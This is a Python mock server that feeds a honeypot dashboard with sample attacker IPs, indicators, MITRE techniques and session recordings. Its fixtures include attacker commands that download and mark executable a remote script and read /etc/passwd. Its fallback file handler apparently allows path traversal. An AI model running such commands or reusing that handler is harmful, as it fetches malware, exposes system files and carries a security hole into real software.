"""Zero-dependency standalone server to run the HoneyTrap frontend dashboard.

Serves the frontend UI and mock API endpoints with realistic cybersecurity telemetry.
Runs directly on standard library Python without requiring pip packages.
"""

import http.server
import json
import mimetypes
import os
import random
import socketserver
import time
from datetime import datetime, timezone
from pathlib import Path

PORT = 3000
BASE_DIR = Path(__file__).resolve().parent
FRONTEND_DIR = BASE_DIR / "frontend"

SAMPLE_ATTACKERS = [
    {"ip": "185.220.101.5", "country": "Germany", "lat": 52.52, "lon": 13.405, "event_count": 142, "protocols": ["ssh", "http"]},
    {"ip": "45.154.255.88", "country": "Netherlands", "lat": 52.367, "lon": 4.904, "event_count": 98, "protocols": ["ssh"]},
    {"ip": "194.26.29.112", "country": "Russia", "lat": 55.755, "lon": 37.617, "event_count": 87, "protocols": ["http", "ftp"]},
    {"ip": "103.149.28.14", "country": "India", "lat": 28.613, "lon": 77.209, "event_count": 64, "protocols": ["ssh"]},
    {"ip": "198.51.100.22", "country": "United States", "lat": 37.774, "lon": -122.419, "event_count": 55, "protocols": ["http"]},
    {"ip": "141.98.11.90", "country": "Bulgaria", "lat": 42.697, "lon": 23.321, "event_count": 41, "protocols": ["ftp"]},
]

SAMPLE_IOCS = [
    {"type": "IP", "value": "185.220.101.5", "confidence": 1.0, "first_seen": "2026-10-27T18:12:00Z", "last_seen": "2026-10-27T20:00:10Z"},
    {"type": "URL", "value": "http://185.220.101.5/bins/arm7.sh", "confidence": 0.9, "first_seen": "2026-10-27T18:15:20Z", "last_seen": "2026-10-27T19:40:05Z"},
    {"type": "CREDENTIAL", "value": "root:admin123", "confidence": 0.95, "first_seen": "2026-10-27T17:50:00Z", "last_seen": "2026-10-27T19:55:00Z"},
    {"type": "CREDENTIAL", "value": "admin:SuperSecretPassword123", "confidence": 0.95, "first_seen": "2026-10-27T18:30:00Z", "last_seen": "2026-10-27T19:45:00Z"},
    {"type": "USER_AGENT", "value": "Mozilla/5.0 (Hydra-v9.5; Linux x86_64)", "confidence": 0.85, "first_seen": "2026-10-27T18:00:00Z", "last_seen": "2026-10-27T19:50:00Z"},
    {"type": "DOMAIN", "value": "c2-mirai-botnet.top", "confidence": 0.8, "first_seen": "2026-10-27T19:05:00Z", "last_seen": "2026-10-27T19:52:00Z"},
]

SAMPLE_MITRE = [
    {"technique_id": "T1110", "name": "Brute Force", "tactic": "Credential Access", "count": 218},
    {"technique_id": "T1078", "name": "Valid Accounts", "tactic": "Initial Access", "count": 142},
    {"technique_id": "T1190", "name": "Exploit Public-Facing App", "tactic": "Initial Access", "count": 115},
    {"technique_id": "T1059", "name": "Command & Scripting", "tactic": "Execution", "count": 94},
    {"technique_id": "T1083", "name": "File & Directory Discovery", "tactic": "Discovery", "count": 82},
    {"technique_id": "T1105", "name": "Ingress Tool Transfer", "tactic": "Command and Control", "count": 67},
    {"technique_id": "T1082", "name": "System Info Discovery", "tactic": "Discovery", "count": 51},
]

SAMPLE_EVENTS = [
    {
        "id": "ev-01",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "protocol": "ssh",
        "event_type": "command",
        "source_ip": "185.220.101.5",
        "data": {"command": "wget http://185.220.101.5/bins/arm7.sh; chmod +x arm7.sh"},
        "mitre_techniques": ["T1059", "T1105", "T1071.001"],
        "geo": {"country": "Germany", "lat": 52.52, "lon": 13.405},
    },
    {
        "id": "ev-02",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "protocol": "http",
        "event_type": "auth_attempt",
        "source_ip": "194.26.29.112",
        "data": {"username": "admin", "password": "SuperSecretPassword123", "path": "/wp-login.php"},
        "mitre_techniques": ["T1190", "T1110.001"],
        "geo": {"country": "Russia", "lat": 55.755, "lon": 37.617},
    },
    {
        "id": "ev-03",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "protocol": "ssh",
        "event_type": "command",
        "source_ip": "45.154.255.88",
        "data": {"command": "cat /etc/passwd"},
        "mitre_techniques": ["T1005", "T1083"],
        "geo": {"country": "Netherlands", "lat": 52.367, "lon": 4.904},
    },
    {
        "id": "ev-04",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "protocol": "ftp",
        "event_type": "file_upload",
        "source_ip": "141.98.11.90",
        "data": {"filename": "payload.elf", "size_bytes": 14200},
        "mitre_techniques": ["T1105"],
        "geo": {"country": "Bulgaria", "lat": 42.697, "lon": 23.321},
    },
    {
        "id": "ev-05",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "protocol": "ssh",
        "event_type": "auth_attempt",
        "source_ip": "103.149.28.14",
        "data": {"username": "root", "password": "password", "success": True},
        "mitre_techniques": ["T1078", "T1021.004"],
        "geo": {"country": "India", "lat": 28.613, "lon": 77.209},
    },
]

SAMPLE_SESSIONS = [
    {
        "id": "sess-ssh-8a92b1",
        "protocol": "ssh",
        "source_ip": "185.220.101.5",
        "source_port": 49214,
        "start_time": "2026-10-27T19:40:10Z",
        "events_count": 8,
        "asciicast": (
            '{"version": 2, "width": 80, "height": 24, "timestamp": 1729000000}\n'
            '[0.5, "o", "root@ubuntu-server:~# "]\n'
            '[1.2, "i", "whoami\\r"]\n'
            '[1.3, "o", "root\\r\\nroot@ubuntu-server:~# "]\n'
            '[2.1, "i", "cat /etc/passwd\\r"]\n'
            '[2.2, "o", "root:x:0:0:root:/root:/bin/bash\\r\\nubuntu:x:1000:1000::/home/ubuntu:/bin/bash\\r\\nroot@ubuntu-server:~# "]\n'
            '[3.5, "i", "wget http://185.220.101.5/bins/arm7.sh\\r"]\n'
            '[3.8, "o", "--2026-10-27 19:40:15-- saved [14022/14022]\\r\\nroot@ubuntu-server:~# "]\n'
            '[4.5, "i", "exit\\r"]\n'
            '[4.6, "o", "logout\\r\\n"]\n'
        ),
    },
    {
        "id": "sess-http-3c11f4",
        "protocol": "http",
        "source_ip": "194.26.29.112",
        "source_port": 51200,
        "start_time": "2026-10-27T19:50:00Z",
        "events_count": 4,
        "asciicast": None,
    },
]


class HoneyTrapHandler(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(204)
        self.end_headers()

    def do_GET(self):
        path = self.path.split("?")[0]

        # 1. API Endpoints
        if path == "/api/stats":
            data = {
                "total_events": 687,
                "total_sessions": 128,
                "unique_ips": 42,
                "events_last_24h": 314,
                "sessions_last_24h": 89,
                "total_iocs": len(SAMPLE_IOCS),
                "protocol_breakdown": {"ssh": 395, "http": 210, "ftp": 82},
            }
            return self._send_json(data)

        if path == "/api/events":
            return self._send_json({"events": SAMPLE_EVENTS, "total": len(SAMPLE_EVENTS), "page": 1, "pages": 1})

        if path == "/api/mitre":
            return self._send_json(SAMPLE_MITRE)

        if path == "/api/iocs":
            return self._send_json(SAMPLE_IOCS)

        if path == "/api/attackers":
            return self._send_json(SAMPLE_ATTACKERS)

        if path == "/api/sessions":
            return self._send_json({"sessions": SAMPLE_SESSIONS, "total": len(SAMPLE_SESSIONS), "page": 1, "pages": 1})

        if path.startswith("/api/sessions/"):
            sid = path.replace("/api/sessions/", "")
            for s in SAMPLE_SESSIONS:
                if s["id"] == sid:
                    return self._send_json(s)
            return self._send_json(SAMPLE_SESSIONS[0])

        if path == "/api/export/stix":
            stix_bundle = {
                "type": "bundle",
                "id": "bundle--honeytrap-export",
                "objects": [
                    {"type": "identity", "name": "HoneyTrap Sensor", "spec_version": "2.1"},
                    {"type": "indicator", "pattern": "[ipv4-addr:value = '185.220.101.5']", "pattern_type": "stix"},
                ],
            }
            return self._send_json(stix_bundle)

        if path == "/api/export/blocklist":
            blocklist = "# HoneyTrap Automated Blocklist\n" + "\n".join(f"iptables -A INPUT -s {a['ip']} -j DROP" for a in SAMPLE_ATTACKERS)
            return self._send_text(blocklist, content_type="text/plain")

        # 2. Static files
        if path == "/" or path == "/index.html":
            return self._send_file(FRONTEND_DIR / "index.html", "text/html")

        if path.startswith("/static/"):
            rel_name = path.replace("/static/", "")
            file_path = FRONTEND_DIR / rel_name
            if file_path.is_file():
                mime, _ = mimetypes.guess_type(str(file_path))
                return self._send_file(file_path, mime or "application/octet-stream")

        # Fallback to serving from frontend
        file_path = FRONTEND_DIR / path.lstrip("/")
        if file_path.is_file():
            mime, _ = mimetypes.guess_type(str(file_path))
            return self._send_file(file_path, mime or "application/octet-stream")

        self.send_error(404, "Not Found")

    def _send_json(self, data):
        payload = json.dumps(data).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def _send_text(self, text, content_type="text/plain"):
        payload = text.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", f"{content_type}; charset=utf-8")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def _send_file(self, path, mime):
        try:
            with open(path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", mime)
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except Exception:
            self.send_error(500, "Error reading file")


def run():
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), HoneyTrapHandler) as httpd:
        print(f"HoneyTrap UI server active at http://localhost:{PORT}")
        httpd.serve_forever()


if __name__ == "__main__":
    run()
